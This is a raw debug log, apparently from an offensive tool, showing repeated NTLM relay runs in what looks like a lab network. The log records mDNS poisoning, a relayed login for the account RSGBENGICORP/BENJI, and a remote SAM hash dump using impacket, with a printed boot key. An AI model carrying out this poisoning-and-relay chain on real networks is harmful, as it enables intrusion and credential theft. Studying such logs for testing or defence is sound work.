2021-11-07 11:27:37.588 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:390 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-07 12:14:09.871 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-07 12:14:09.881 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:289 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-11-07 12:14:09.907 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-07 12:14:09.909 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:82 - Starting smb-relay server...
2021-11-07 12:14:09.941 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-11-07 12:14:14.668 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:14.669 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:14.669 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-07 12:14:14.718 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:14.719 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:14.719 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-07 12:14:14.759 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:14.759 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:14.760 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:14.760 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:16.168 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-11-07 12:14:16.784 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-11-07 12:14:16.833 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-07 12:14:16.838 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-07 12:14:17.071 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:17.071 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:17.072 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:17.072 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:17.073 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:17.073 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:17.074 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:17.074 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:18.060 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:18.061 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:18.062 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:18.062 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:18.075 | DEBUG    | impacket.examples.secretsdump:__checkServiceStatus:663 - Service RemoteRegistry is already running
2021-11-07 12:14:18.088 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for JD
2021-11-07 12:14:18.101 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Skew1
2021-11-07 12:14:18.120 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for GBG
2021-11-07 12:14:18.669 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Data
2021-11-07 12:14:19.718 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-11-07 12:14:19.750 | DEBUG    | impacket.examples.secretsdump:saveSAM:800 - Saving remote SAM database
2021-11-07 12:14:21.860 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-11-07 12:14:21.876 | DEBUG    | impacket.examples.secretsdump:getHBootKey:1161 - Calculating HashedBootKey from SAM
2021-11-07 12:14:32.432 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:14:37.094 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:14:42.010 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:14:46.863 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:14:51.409 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:14:51.568 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
2021-11-07 12:14:54.199 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:54.199 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:54.199 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-07 12:14:54.266 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:54.266 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:54.266 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-07 12:14:54.311 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:54.343 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:54.365 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:54.365 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:55.210 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:55.220 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:55.221 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:55.222 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:55.440 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-07 12:14:55.462 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-07 12:14:55.606 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:55.606 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:55.607 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:55.607 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:55.608 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:55.608 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:55.609 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:55.609 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:56.596 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:56.596 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:14:56.597 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:14:56.597 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:15:02.463 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:15:02.464 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:15:02.464 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-07 12:15:02.496 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:15:02.497 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:15:02.497 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-07 12:15:02.531 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:15:02.531 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:15:02.532 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:15:02.532 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:15:03.929 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-07 12:15:03.934 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-10: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-07 12:18:18.421 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:402 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-07 12:18:18.433 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-07 12:18:18.475 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:288 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-11-07 12:18:18.487 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-07 12:18:18.491 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:82 - Starting smb-relay server...
2021-11-07 12:18:18.507 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-11-07 12:18:30.063 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:30.063 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:30.063 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-07 12:18:30.116 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:30.116 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:30.116 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-07 12:18:30.152 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:30.152 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:30.153 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:30.153 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:31.055 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:31.055 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:31.057 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:31.057 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:31.079 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-11-07 12:18:31.105 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-11-07 12:18:31.112 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-07 12:18:31.112 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-07 12:18:31.159 | DEBUG    | impacket.examples.secretsdump:__checkServiceStatus:663 - Service RemoteRegistry is already running
2021-11-07 12:18:31.176 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for JD
2021-11-07 12:18:31.187 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:31.187 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:31.189 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:31.191 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:31.192 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:31.192 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:31.193 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:31.193 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:31.200 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Skew1
2021-11-07 12:18:31.214 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for GBG
2021-11-07 12:18:31.226 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Data
2021-11-07 12:18:31.243 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-11-07 12:18:31.243 | DEBUG    | impacket.examples.secretsdump:saveSAM:800 - Saving remote SAM database
2021-11-07 12:18:31.287 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-11-07 12:18:31.295 | DEBUG    | impacket.examples.secretsdump:getHBootKey:1161 - Calculating HashedBootKey from SAM
2021-11-07 12:18:31.462 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:18:31.529 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:18:31.599 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:18:31.678 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:18:31.765 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:18:31.766 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
2021-11-07 12:18:32.196 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:32.196 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:32.197 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:32.198 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:41.850 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:41.850 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:41.850 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.129[0m
2021-11-07 12:18:41.887 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:18:41.888 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:18:41.888 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
2021-11-07 12:18:58.531 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_ntlm_relay:446 - Finishing ntlm relay attack in the background ...
2021-11-07 12:19:02.408 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:402 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-07 12:19:02.408 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-07 12:19:02.410 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:288 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-11-07 12:19:02.422 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-07 12:19:02.428 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:82 - Starting smb-relay server...
2021-11-07 12:19:02.433 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-11-07 12:19:09.276 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:09.277 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:09.277 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-07 12:19:09.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:09.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:09.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-07 12:19:09.339 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:09.340 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:09.341 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:09.341 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:10.260 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:10.260 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:10.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:10.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:10.286 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-11-07 12:19:10.334 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-11-07 12:19:10.352 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-07 12:19:10.352 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-07 12:19:10.364 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:10.365 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:10.365 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:10.366 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:10.367 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:10.367 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:10.370 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-07 12:19:10.370 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-07 12:19:10.396 | DEBUG    | impacket.examples.secretsdump:__checkServiceStatus:663 - Service RemoteRegistry is already running
2021-11-07 12:19:10.415 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for JD
2021-11-07 12:19:10.444 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Skew1
2021-11-07 12:19:10.456 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for GBG
2021-11-07 12:19:10.471 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Data
2021-11-07 12:19:10.483 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-11-07 12:19:10.483 | DEBUG    | impacket.examples.secretsdump:saveSAM:800 - Saving remote SAM database
2021-11-07 12:19:10.548 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-11-07 12:19:10.548 | DEBUG    | impacket.examples.secretsdump:getHBootKey:1161 - Calculating HashedBootKey from SAM
2021-11-07 12:19:10.792 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:19:10.866 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:19:10.941 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:19:11.032 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:19:11.119 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-11-07 12:19:11.119 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
